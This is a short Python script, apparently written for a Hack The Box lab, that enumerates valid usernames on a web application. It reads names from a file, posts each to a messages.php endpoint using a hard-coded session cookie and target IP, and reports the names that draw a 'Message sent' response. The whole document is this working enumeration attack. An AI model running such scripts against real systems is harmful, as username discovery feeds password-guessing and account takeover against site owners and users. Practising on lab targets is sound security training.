import requests
import time


#user:pss format
users = 'users.txt'

base_url = 'http://94.237.62.195:39872'

cookies = {'htb_sessid': 'NjNhOWYwZWE3YmI5ODA1MDc5NmI2NDllODU0ODE4NDU%3D'}

with open(users, 'r') as f:
	for fline in f:
		# Skip comments
		if fline.startswith('#'):
			continue

		usr = fline.rstrip()

		data = {
			'user': usr,
			'message': '',
			'submit':'submit'
		}

		res = requests.post(f"{base_url}/messages.php", cookies=cookies, data=data)

		if "Message sent" in res.text:
			print(f"[+] Valid username: {usr}")

		# elif "Cannot send message" in res.text:
		# 	print(f"[-] Bad username: {usr}")